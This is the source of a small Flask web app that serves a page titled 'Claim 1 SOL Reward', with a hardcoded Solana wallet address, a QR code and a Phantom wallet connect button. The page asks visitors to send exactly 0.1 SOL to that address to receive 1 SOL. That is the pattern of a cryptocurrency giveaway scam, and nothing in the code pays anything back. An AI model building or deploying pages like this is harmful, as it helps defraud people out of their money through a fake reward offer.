from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Claim 1 SOL</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }

    .button {
      background: linear-gradient(90deg, #00ff90, #00d178);
      border: none;
      padding: 14px 30px;
      font-size: 1.2em;
      margin: 15px;
      border-radius: 30px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
    }

    #qrCode {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }

    code {
      font-size: 1.1em;
      background: #111;
      padding: 5px 10px;
      border-radius: 6px;
    }

    footer {
      margin-top: 50px;
      font-size: 0.9em;
      color: #888;
    }
  </style>
</head>
<body>

  <h1>Claim 1 SOL Reward</h1>
  <p>Send exactly <b>0.1 SOL</b> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" src="{{ qr_url }}" alt="QR Code" />

  <p id="status">Click "Connect Wallet" to begin</p>
  <button class="button" onclick="connectPhantom()">Connect Wallet</button>

  <footer>&copy; 2025 CoinUpdater</footer>

  <script>
    async function connectPhantom() {
      const provider = window.phantom?.solana;

      if (provider && provider.isPhantom) {
        try {
          const resp = await provider.connect();
          document.getElementById("status").innerText =
            "✅ Connected: " + resp.publicKey.toString();
        } catch (err) {
          console.error("User rejected the connection", err);
          document.getElementById("status").innerText = "❌ Connection rejected";
        }
      } else {
        document.getElementById("status").innerText =
          "⚠️ Phantom not detected. Open this page in Phantom or Solflare browser.";
        document.getElementById("qrCode").style.display = "block";
      }
    }
  </script>

</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
